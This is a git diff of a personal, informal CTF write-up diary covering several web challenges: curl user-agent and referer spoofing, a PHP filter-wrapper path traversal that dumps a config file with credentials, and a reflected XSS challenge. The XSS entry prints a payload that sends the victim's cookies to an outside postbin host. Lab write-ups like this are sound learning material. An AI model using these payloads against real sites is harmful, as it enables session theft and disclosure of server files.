@@ -1,9 +1,133 @@
-#view it in code mode for a smoother exp =)
-warning , quite the extreme language usage forward as i mainly document challneges that i get stuck on , therefore a lil venting after challenge is quite essential 
-This is more for self notes for me to refer back in the future if i by chance get somewhat stuck 
+> [!IMPORTANT]
+> To whoever might be reading this file
+> 
+> some writeups do have more **interesting** language which I have hidden(if you do decide to view it in code mode instead of the nice mode)
+> 
+> these are self notes for me to refer back in the future
+> 
+> lastly, I wish whoever that is reading this a good day and you achieve what you came here for
+
+
+# --- n.d
+first try was -> curl http://165.227.106.113/header.php
+- error got error saying wrong user agent , so curl mentioned that i can specify an agent (whatever that is) to enter the site.
+so i tried curl --user-agent Sup3rS3cr3tAg3nt http://165.227.106.113/header.php which used the agent given by the site
+- next error says i did not come from a site called awesomesauce.com (how dare he discriminate me)
+therefore after some bs and more bs , i figured that i couuld use a referer
+found out using curl -help all   which btw shows all functions of curl
+then the command become like this and the flag came out idk how hahahha 
+
+curl -e awesomesauce.com  --user-agent Sup3rS3cr3tAg3nt http://165.227.106.113/header.php
+
+challenge link -> https://ctflearn.com/challenge/109
+
+yup thats all , fair diffuculty for meduim 
+
+# --- n.d
+okok legit final one for today
+challenge -> https://ctflearn.com/challenge/691
+
+this one quite simple, nc commect to the server , play the betting game 
+simple concept of betting , guess a number, win = ur money + initial bet, loose = initial money - bet
+so if 500 - 500 = 1000 , that explains all i need to redeem the flag 
+
+# --- 31st august 2024
+OK next one , this one not fully solve by me thanks to a community fella in their dc server , still gotta record this thing down for fun
+This ctf is a indi one called 3108 , merdeka themed
+challenge link (not sure how long it will be up) = https://b1bf68f7fd.bahterasiber.my/
+
+When you open the link , you immediately get blasted by music which sets you in merdeka mood. THere are 3 songs, keranamu Malaysia , tanggal31 and Jalur Gemilang
+there are 3 hyeriinks which will each display the lyrics of one of the songs and an audio player to play the song and sing along. 
+
+starting of all web challenge it to look at its source code, it was short , very short
+the entire script was :
+    function setPage(page) {
+        const encodedPage = btoa(page);
+        document.cookie = "page=" + encodedPage + ";path=/";
+        location.reload();
+    }
+
+so i tried to do path traversal first realizing i was dumb
+
+then i followed the 5 line script which by the way wil trigger everytime one of the hyperlinks are clicked and set the "page" variable to the respective page
+then it encodes the page in base 64 and sets it into the cookie named page
+finally, it reloads the page 
+
+i tried to use burpsuite for at least 5 hours trying different cookies and paths 
+i even got access to etc/passwd and /bin/bash
+that aside i also tried to extract information from the audio and even the BACKGROUND IMAGE using binwalk and stings, no luck.
+
+finally after so many tries , time was up and i asked 
+to apparently i was right but wrong, i used php wrapper but not on the config , only on the index file 
+
+
+yeah thats it , you use the wrapper on the config file : php://filter/convert.base64-encode/resource=../../../var/www/html/config.php
+
+
+the website returned : PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gImN1YmFhbiBtZW5nZWhhY2sga2EgaXR1IjsKJHBhc3N3b3JkID0gIjMxMDh7bTRyMV9rMXQ0X3c0cmc0X24zZzRyNH0iOwokZGF0YWJhc2UgPSAiZmxhZyI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgplY2hvICJDb25uZWN0ZWQgc3VjY2Vzc2Z1bGx5IjsKPz4K
+
+
+when decoded we get the php file and BOOM its there : 
+<?php
+$host = "localhost";
+$username = "cubaan mengehack ka itu";
+$password = "3108{m4r1_k1t4_w4rg4_n3g4r4}";
+$database = "flag";
+
+$conn = new mysqli($host, $username, $password, $database);
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+echo "Connected successfully";
+?>
 
 
 
+
+# --- sep26-27 2024
+i spent wayyyyyyyyyyyyyyyyyyyyyyyy too much time on this bs
+this one is a challenge from SKR -> https://skrctf.me/challenges#XSS-GPT 
+had to literally go through piles of writeups just to get to the flag 
+references (totally not in APA)
+https://ctftime.org/writeup/15817 
+https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts
+https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt
+
+special thankyou to postbin -> https://www.postb.in/
+
+challenge starts of with a white ass site with a chat box and a report admin button
+after reading the html, you are somewhat required to have an API key (which i have 0 idea on wtf it is) 
+so i tried editing the parameter as one of the hints say and spammed random things into the apiKey parameter in the site, none worked as expected....
+then i tried the classic xss to trigger alert and it worked, as in the entire site bugged out with a wall of error messages.
+
+After some revisiting of the js, i had to change to payload to </script><script>alert("ayane")</script><script> for it to successfully trigger the xss
+which then also completely broke the site
+then i figured by clicking the report admin button (while the site is not broken) would send a post request to a page called reportAdmin with the api key parameter
+
+after being stuck on the same thing for quite a while (2 hrs) i went to check out some wwriteups 
+thats where i learnet that i can use postbin/webhook in combination with XSS to capture and send data to a given site 
+
+after aa lot of spamming different payloads , this one worked (url encoded)
+
+also first time making a code block here, yay
+```
+</script><script>var i=new Image;i.src="https://www.postb.in/1727372628601-9432018648367/?c="+document.cookie;</script><script>
+```
+
+then i replaced the kep parameter in the post request to the reportAdmin page and checked my postbin site , and there was the flag 
+SKR{R3flec73D_1n_API_k3y_f4ae0d}
+
+time to learn more on hwo this backend stuf and API work
+anyways ending this on a good note, heres a banger i listened to while scritching my head -> https://youtu.be/DZTXaq23534
+
+quick take away to self, please please please inspect the code carefully and if possible in visual studio code so you dont miss any pages or fucntion....
+
+
+
+
+<!--- 
 
 # ---  n.d
 alright its 3 50 in the fcuking morning idk what better to do than ctf instad of sleeping, writeup time....
@@ -25,6 +149,7 @@ y'knwo what , maybe this can be known better as my CTF diary since i yap so much
 aaaaaaaaany ways since i last formatted pc , i lost all my progress(diary) on SKR, gotta redo it here , for now this is all i have , im a poor man , poor of information 
 its 4 01 , my sleep is fked, i havent finished my dailies , im going to sleep , need to contol the ctf addiction !!!
 
+ 
 
 # --- n.d
 I HAVE TO SAY , NO WEED OR GACHA PULLS SHOULD BE ABLE TO BEAT THE HIGH I JUST FELT SOLVING MY FIRST HARD CHALLANGE 
@@ -106,96 +231,7 @@ it returned the information of the first dog and the flag
 alright thats a grandfather level story , time to rest , enough games today 
 
 
-
-# --- n.d
-OK next one , this one not fully solve by me thanks to a community fella in their dc server , still gotta record this thing down for fun
-This ctf is a indi one called 3108 , merdeka themed
-challenge link (not sure how long it will be up) = https://b1bf68f7fd.bahterasiber.my/
-
-When you open the link , you immediately get blasted by music which sets you in merdeka mood. THere are 3 songs, keranamu Malaysia , tanggal31 and Jalur Gemilang
-there are 3 hyeriinks which will each display the lyrics of one of the songs and an audio player to play the song and sing along. 
-
-starting of all web challenge it to look at its source code, it was short , very short
-the entire script was :
-    function setPage(page) {
-        const encodedPage = btoa(page);
-        document.cookie = "page=" + encodedPage + ";path=/";
-        location.reload();
-    }
-
-so i tried to do path traversal first realizing i was dumb
-
-then i followed the 5 line script which by the way wil trigger everytime one of the hyperlinks are clicked and set the "page" variable to the respective page
-then it encodes the page in base 64 and sets it into the cookie named page
-finally, it reloads the page 
-
-i tried to use burpsuite for at least 5 hours trying different cookies and paths 
-i even got access to etc/passwd and /bin/bash
-that aside i also tried to extract information from the audio and even the BACKGROUND IMAGE using binwalk and stings, no luck.
-
-finally after so many tries , time was up and i asked 
-to apparently i was right but wrong, i used php wrapper but not on the config , only on the index file 
-
-
-yeah thats it , you use the wrapper on the config file : php://filter/convert.base64-encode/resource=../../../var/www/html/config.php
-
-
-the website returned : PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gImN1YmFhbiBtZW5nZWhhY2sga2EgaXR1IjsKJHBhc3N3b3JkID0gIjMxMDh7bTRyMV9rMXQ0X3c0cmc0X24zZzRyNH0iOwokZGF0YWJhc2UgPSAiZmxhZyI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgplY2hvICJDb25uZWN0ZWQgc3VjY2Vzc2Z1bGx5IjsKPz4K
-
-
-when decoded we get the php file and BOOM its there : 
-<?php
-$host = "localhost";
-$username = "cubaan mengehack ka itu";
-$password = "3108{m4r1_k1t4_w4rg4_n3g4r4}";
-$database = "flag";
-
-$conn = new mysqli($host, $username, $password, $database);
-
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
-}
-
-echo "Connected successfully";
-?>
-
-# --- sep26-27 2024
-i spent wayyyyyyyyyyyyyyyyyyyyyyyy too much time on this bs
-this one is a challenge from SKR -> https://skrctf.me/challenges#XSS-GPT 
-had to literally go through piles of writeups just to get to the flag 
-references (totally not in APA)
-https://ctftime.org/writeup/15817 
-https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts
-https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt
-
-special thankyou to postbin -> https://www.postb.in/
-
-challenge starts of with a white ass site with a chat box and a report admin button
-after reading the html, you are somewhat required to have an API key (which i have 0 idea on wtf it is) 
-so i tried editing the parameter as one of the hints say and spammed random things into the apiKey parameter in the site, none worked as expected....
-then i tried the classic xss to trigger alert and it worked, as in the entire site bugged out with a wall of error messages.
-
-After some revisiting of the js, i had to change to payload to </script><script>alert("ayane")</script><script> for it to successfully trigger the xss
-which then also completely broke the site
-then i figured by clicking the report admin button (while the site is not broken) would send a post request to a page called reportAdmin with the api key parameter
-
-after being stuck on the same thing for quite a while (2 hrs) i went to check out some wwriteups 
-thats where i learnet that i can use postbin/webhook in combination with XSS to capture and send data to a given site 
-
-after aa lot of spamming different payloads , this one worked (url encoded)
-
-also first time making a code block here, yay
-```
-</script><script>var i=new Image;i.src="https://www.postb.in/1727372628601-9432018648367/?c="+document.cookie;</script><script>
-```
-
-then i replaced the kep parameter in the post request to the reportAdmin page and checked my postbin site , and there was the flag 
-SKR{R3flec73D_1n_API_k3y_f4ae0d}
-
-time to learn more on hwo this backend stuf and API work
-anyways ending this on a good note, heres a banger i listened to while scritching my head -> https://youtu.be/DZTXaq23534
-
-quick take away to self, please please please inspect the code carefully and if possible in visual studio code so you dont miss any pages or fucntion....
+-->
 
 
 
